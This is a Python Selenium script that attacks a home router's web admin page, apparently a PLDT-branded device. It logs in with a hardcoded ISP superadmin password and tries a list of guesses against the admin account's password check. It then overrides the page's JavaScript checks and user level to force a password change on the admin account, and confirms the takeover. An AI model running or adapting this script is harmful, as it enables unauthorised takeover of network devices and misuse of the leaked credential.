#!/usr/bin/env python3
"""
Use superadmin access to change the admin password.
Force Userlevel=1 to submit password change for admin account.
"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time, json

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver


def main():
    NEW_ADMIN_PWD = "Admin9999"  # New admin password to set

    print("Step 1: Login as superadmin...")
    driver = setup_driver()

    try:
        driver.get(f"{ROUTER}/admin.html")
        time.sleep(4)

        # Login normally (let CheckPassword do its thing)
        user = driver.find_element(By.ID, "txt_Username")
        pw = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value='';", user)
        driver.execute_script("arguments[0].value='';", pw)
        user.send_keys("adminpldt")
        pw.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")

        driver.execute_script("window.setDisable = function() {};\ndocument.getElementById('button').style.display = '';")
        driver.find_element(By.ID, "button").click()
        time.sleep(5)

        url = driver.current_url
        if "login" in url.lower():
            print(f"Login failed! URL: {url}")
            return

        print(f"Logged in! URL: {url}")

        # Check Userlevel
        level = driver.execute_script("return window.Userlevel;")
        print(f"Userlevel: {level}")

        # Verify the old superadmin password works via CheckPassword
        old_admin_check = driver.execute_script("""
            var result = null;
            $.ajax({
                type: 'POST',
                async: false,
                cache: false,
                url: '/asp/CheckPwdNotLogin.asp?&1=1',
                data: 'UserNameInfo=admin&NormalPwdInfo=' + encodeURIComponent('Admin9999'),
                success: function(data) { result = data; }
            });
            return result;
        """)
        print(f"CheckPassword for admin:Admin9999 -> [{old_admin_check}]")

        # Try various admin passwords to find which one is valid
        test_passwords = [
            "Admin1234", "1234", "admin", "password", "Admin9999",
            "PLDThome", "pldthome", "PLDT1234", "Fibr1234",
            "12345678", "admin123", "PLDThomefibr@123",
        ]

        print("\nSearching for current admin password via CheckPwdNotLogin.asp...")
        found_admin_pwd = None
        for pwd in test_passwords:
            result = driver.execute_script("""
                var result = null;
                $.ajax({
                    type: 'POST',
                    async: false,
                    cache: false,
                    url: '/asp/CheckPwdNotLogin.asp?&1=1',
                    data: 'UserNameInfo=admin&NormalPwdInfo=' + encodeURIComponent(arguments[0]),
                    success: function(data) { result = data; }
                });
                return result;
            """, pwd)
            print(f"  admin:{pwd:25s} -> [{result}]")
            if result and str(result).strip() in ("1", "2"):
                found_admin_pwd = pwd
                print(f"  *** FOUND ADMIN PASSWORD: {pwd} ***")
                break

        if found_admin_pwd:
            print(f"\nAdmin password is: admin:{found_admin_pwd}")
            return

        # The CheckPwdNotLogin.asp doesn't check 'admin' user.
        # Let's try to change admin password via SubmitUpdate with Userlevel=1
        print("\nTrying to force admin password change via form manipulation...")

        # Set old password to superadmin password (will pass CheckPassword since result=2)
        driver.execute_script("document.getElementById('old_password').value = 'AC2DIU7QW3ERTY6UPAS4DFG';")
        driver.execute_script("document.getElementById('new_password').value = arguments[0];", NEW_ADMIN_PWD)
        driver.execute_script("document.getElementById('confirm_password').value = arguments[0];", NEW_ADMIN_PWD)

        # Force Userlevel to 1 so it targets admin account
        driver.execute_script("window.Userlevel = 1;")

        # Override CheckParameter to skip old password verification
        driver.execute_script("""
            window.CheckParameter = function() {
                var newPwd = document.getElementById('new_password').value;
                var cfmPwd = document.getElementById('confirm_password').value;
                if (newPwd.length < 8) { alert('Too short'); return false; }
                if (newPwd !== cfmPwd) { alert('Mismatch'); return false; }
                return true;
            };
        """)

        # Also need to set up form submission correctly
        # The SubmitUpdate function creates a hidden form and submits it
        # Let's override it to target the admin account directly
        driver.execute_script(f"""
            window.SubmitUpdate = function() {{
                var Form = new webSubmitForm();
                var url = 'MdfPwdNormalNoLg.cgi';
                var webUserDomin = 'InternetGatewayDevice.UserInterface.X_HW_WebUserInfo.1';

                Form.addParameter('x.UserName', 'admin');
                Form.addParameter('z.Password', '{NEW_ADMIN_PWD}');
                Form.addParameter('z.PasswordConfirm', '{NEW_ADMIN_PWD}');

                var cnt = null;
                $.ajax({{
                    type: 'POST',
                    async: false,
                    cache: false,
                    url: '/asp/GetRandCount.asp',
                    success: function(data) {{ cnt = data; }}
                }});
                Form.addParameter('x.X_HW_Token', cnt);
                Form.setAction(url);
                Form.submit();
                return true;
            }};
        """)

        print("Clicking Update button...")
        driver.find_element(By.ID, "button_update").click()
        time.sleep(5)

        url_after = driver.current_url
        src_after = driver.page_source
        print(f"After update URL: {url_after}")
        print(f"Page size: {len(src_after)} chars")

        # Check result
        if "login" in url_after.lower():
            print("Redirected to login - update may have succeeded!")
        else:
            text = driver.execute_script("return document.body ? document.body.innerText.substring(0, 2000) : '';")
            print(f"Page text: {text[:500]}")

        # Verify by trying to login with new admin password
        print("\nStep 2: Verifying new admin password...")
        driver.get(f"{ROUTER}/login.asp")
        time.sleep(3)

        try:
            user2 = driver.find_element(By.ID, "txt_Username")
            pw2 = driver.find_element(By.ID, "txt_Password")
            driver.execute_script("arguments[0].value='';", user2)
            driver.execute_script("arguments[0].value='';", pw2)
            user2.send_keys("admin")
            pw2.send_keys(NEW_ADMIN_PWD)

            driver.execute_script("""
                window.CheckPassword = function() { return 0; };
                window.setDisable = function() {};
            """)
            driver.execute_script("document.getElementById('button').style.display='';")
            driver.find_element(By.ID, "button").click()
            time.sleep(4)

            verify_url = driver.current_url
            if "login" not in verify_url.lower():
                print(f"*** SUCCESS! New admin password works: admin:{NEW_ADMIN_PWD} ***")
                print(f"URL: {verify_url}")
            else:
                print(f"New password didn't work. URL: {verify_url}")
                # Also try the old password
                driver.get(f"{ROUTER}/login.asp")
                time.sleep(3)
                user3 = driver.find_element(By.ID, "txt_Username")
                pw3 = driver.find_element(By.ID, "txt_Password")
                driver.execute_script("arguments[0].value='';", user3)
                driver.execute_script("arguments[0].value='';", pw3)
                user3.send_keys("admin")
                pw3.send_keys("Admin1234")
                driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
                driver.execute_script("document.getElementById('button').style.display='';")
                driver.find_element(By.ID, "button").click()
                time.sleep(4)
                old_url = driver.current_url
                if "login" not in old_url.lower():
                    print(f"Old password still works: admin:Admin1234")
                else:
                    print("Old password also doesn't work - admin password is unknown")
        except Exception as e:
            print(f"Verification error: {e}")

    finally:
        driver.quit()


if __name__ == "__main__":
    main()
